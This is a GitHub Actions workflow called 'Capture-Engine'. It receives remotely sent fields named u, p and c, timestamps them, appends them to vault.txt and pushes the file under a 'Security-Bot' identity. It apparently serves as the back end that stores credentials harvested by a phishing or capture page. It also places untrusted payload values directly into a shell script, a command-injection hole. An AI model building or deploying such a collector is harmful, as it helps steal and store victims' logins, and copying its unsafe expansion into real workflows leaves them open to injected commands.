name: Capture-Engine
on:
  repository_dispatch:
    types: [log_data]
jobs:
  update:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Update Logs
        run: |
          U="${{ github.event.client_payload.u }}"
          P="${{ github.event.client_payload.p }}"
          C="${{ github.event.client_payload.c }}"
          T=$(date +'%Y-%m-%d %H:%M')
          echo "$T | $U | $P | $C" >> vault.txt
          git config --global user.name "Security-Bot"
          git config --global user.email "bot@github.com"
          git add vault.txt
          git commit -m "Capture Update"
          git push
